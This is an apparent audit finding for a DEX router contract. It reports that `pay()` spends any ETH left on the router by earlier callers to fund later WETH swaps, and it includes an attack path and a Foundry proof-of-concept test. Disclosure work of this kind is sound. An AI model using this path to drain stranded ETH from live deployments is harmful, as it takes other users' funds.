### Title
Router's `pay()` Consumes Stranded ETH From Prior Callers to Fund Subsequent WETH Swaps — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

The `pay()` function in `PeripheryPayments` uses `address(this).balance` (the router's total native ETH balance) to fund WETH swap inputs without verifying that the ETH belongs to the current payer. Any ETH stranded on the router from a prior caller's `msg.value` overpayment is silently consumed to subsidize a subsequent user's swap.

### Finding Description

`pay()` contains a WETH-specific branch that checks the router's native ETH balance before deciding how to settle the swap input: [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
```

There is no check that `address(this).balance` was contributed by the current `payer` in the current transaction. The function simply uses whatever ETH happens to be on the router.

ETH can be legitimately stranded on the router because all swap entry points are `payable`: [2](#0-1) 

If user A calls `exactInputSingle{value: 1 ETH}(amountIn=0.5 ETH, tokenIn=WETH)` without appending a `refundETH()` call, the router retains 0.5 ETH after the swap. The `receive()` guard only blocks *direct* ETH sends from non-WETH addresses: [3](#0-2) 

It does not prevent ETH from accumulating via `msg.value` in payable swap functions.

### Impact Explanation

**User A loses ETH; User B gets a free (or subsidized) swap.**

Attack path:
1. User A calls `exactInputSingle{value: 1 ETH}(tokenIn=WETH, amountIn=0.5 ETH)` without `refundETH()`. Router retains 0.5 ETH.
2. User B calls `exactInputSingle(tokenIn=WETH, amountIn=0.3 ETH)` (no ETH sent, no WETH approval needed).
3. Inside `_justPayCallback`, `pay()` is called with `payer=userB, token=WETH, value=0.3 ETH`.
4. `nativeBalance = 0.5 ETH >= value = 0.3 ETH` → router deposits 0.3 ETH as WETH and transfers it to the pool.
5. No `safeTransferFrom(userB, ...)` is ever called. User B's swap is fully funded by user A's ETH. [4](#0-3) 

This is a direct loss of user principal (user A's ETH) above Sherlock Critical thresholds.

### Likelihood Explanation

- Stranding ETH on the router is easy: any user who calls a payable swap function with `msg.value > amountIn` and omits `refundETH()` leaves ETH behind. The existing test suite explicitly demonstrates this pattern is expected and common.
- The router's ETH balance is publicly readable on-chain; an attacker can monitor it and immediately call a WETH swap to drain it.
- No special permissions, malicious pool, or non-standard token behavior is required. [5](#0-4) 

### Recommendation

Track how much ETH the current `msg.sender` contributed in the current transaction (e.g., via a transient storage slot set at the payable entry point), and limit `pay()`'s native ETH consumption to that amount. Alternatively, only consume `msg.value` directly (passed through to `pay()` as a parameter) rather than reading `address(this).balance`, which aggregates ETH from all prior callers.

### Proof of Concept

```solidity
// Foundry fork test sketch
function test_strandedEthSubsidizesAttacker() public {
    // User A sends 1 ETH but only swaps 0.5 ETH worth, forgets refundETH
    vm.prank(userA);
    router.exactInputSingle{value: 1 ether}(ExactInputSingleParams({
        pool: pool, tokenIn: weth, tokenOut: token1,
        zeroForOne: true, amountIn: 0.5 ether,
        amountOutMinimum: 0, recipient: userA,
        deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
    }));
    // Router now holds 0.5 ETH belonging to userA

    uint256 userBWethBefore = weth.balanceOf(userB);
    uint256 userBToken1Before = token1.balanceOf(userB);

    // User B swaps with tokenIn=WETH, sends no ETH, has no WETH approval
    vm.prank(userB);
    router.exactInputSingle(ExactInputSingleParams({
        pool: pool, tokenIn: weth, tokenOut: token1,
        zeroForOne: true, amountIn: 0.3 ether,
        amountOutMinimum: 0, recipient: userB,
        deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
    }));

    // Assert: userB received token1 without spending any WETH
    assertEq(weth.balanceOf(userB), userBWethBefore, "userB spent no WETH");
    assertGt(token1.balanceOf(userB), userBToken1Before, "userB received token1");
    // Assert: userA's ETH was consumed (router drained 0.3 ETH of userA's 0.5 ETH)
    assertEq(address(router).balance, 0.2 ether, "userA's ETH partially stolen");
}
```
